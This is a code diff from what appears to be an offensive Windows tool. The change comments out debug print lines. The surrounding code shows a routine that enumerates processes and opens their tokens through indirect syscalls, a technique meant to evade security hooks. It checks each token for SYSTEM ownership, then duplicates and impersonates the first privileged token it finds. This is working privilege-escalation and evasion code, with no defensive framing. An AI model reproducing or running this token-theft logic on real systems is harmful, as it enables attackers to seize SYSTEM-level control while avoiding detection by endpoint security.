@@ -82,7 +82,7 @@ BOOL IsSystemProcess(HANDLE hToken, const wchar_t* procName)
     status = 0xC0000023;
     pTokenUser = NULL;
     pTokenUserSize = sizeof(PTOKEN_USER);
-    printf("Checking if process %S is run by SYSTEM\n", procName);
+    //printf("[DEBUG] Checking if process %S is run by SYSTEM\n", procName);
     while (status == 0xC0000023 || status == 0xC0000004)
     {
         pTokenUser = (PTOKEN_USER)malloc(pTokenUserSize);
@@ -98,7 +98,7 @@ BOOL IsSystemProcess(HANDLE hToken, const wchar_t* procName)
             pTokenUserSize,
             &pTokenUserSize
         );
-        printf("Querying token information for process %S, status = %d\n", procName, status);
+        //printf("[DEBUG] Querying token information for process %S, status = %d\n", procName, status);
     }
 
     if (!NT_SUCCESS(status)) {
@@ -219,7 +219,7 @@ HANDLE AXIOM_DuplicatePrivilegedToken(LUID luid)
                     sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
                     continue;
                 }
-                printf("Process %S opened !\n", sysProcInfo->ImageName.Buffer);
+                //printf("[DEBUG] Process %S opened !\n", sysProcInfo->ImageName.Buffer);
                 IndirectSyscall(
                     status,
                     AXIOM_SSN_NtOpenProcessToken,
@@ -228,15 +228,15 @@ HANDLE AXIOM_DuplicatePrivilegedToken(LUID luid)
                     &hToken
                 );
                 if (status == 0xC0000022) {
-                    printf("Token open for process %S failed, skipping...\n", sysProcInfo->ImageName.Buffer);
+                    //printf("[DEBUG] Token open for process %S failed, skipping...\n", sysProcInfo->ImageName.Buffer);
                     sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
                     continue;
                 }
-                printf("Token opened !\n");
+                //printf("[DEBUG] Token opened !\n");
 
                 if (IsSystemProcess(hToken, sysProcInfo->ImageName.Buffer))
                 {
-                    printf("Process %S is run by SYSTEM, duplicating...\n", sysProcInfo->ImageName.Buffer);
+                    //printf("[DEBUG] Process %S is run by SYSTEM, duplicating...\n", sysProcInfo->ImageName.Buffer);
                     IndirectSyscall(
                         status,
                         AXIOM_SSN_NtDuplicateToken,
@@ -248,11 +248,11 @@ HANDLE AXIOM_DuplicatePrivilegedToken(LUID luid)
                         &hDuplicate
                     );
                     if (status == 0xC0000022) {
-                        printf("Duplication for process %S failed, skipping...\n", sysProcInfo->ImageName.Buffer);
+                        //printf("[DEBUG] Duplication for process %S failed, skipping...\n", sysProcInfo->ImageName.Buffer);
                         sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
                         continue;
                     }
-                    printf("Duplication success\n", sysProcInfo->ImageName.Buffer);
+                    //printf("[DEBUG] Duplication success\n", sysProcInfo->ImageName.Buffer);
 
                     if (ImpersonateTargetToken(hDuplicate)) {
                         printf("Privileged Token impersonated :)\n");
@@ -262,7 +262,7 @@ HANDLE AXIOM_DuplicatePrivilegedToken(LUID luid)
                     continue;
                 }
                 else {
-                    printf("Process %S is not SYSTEM :/\n", sysProcInfo->ImageName.Buffer);
+                    //printf("[DEBUG] Process %S is not SYSTEM :/\n", sysProcInfo->ImageName.Buffer);
                 }
             }
         }
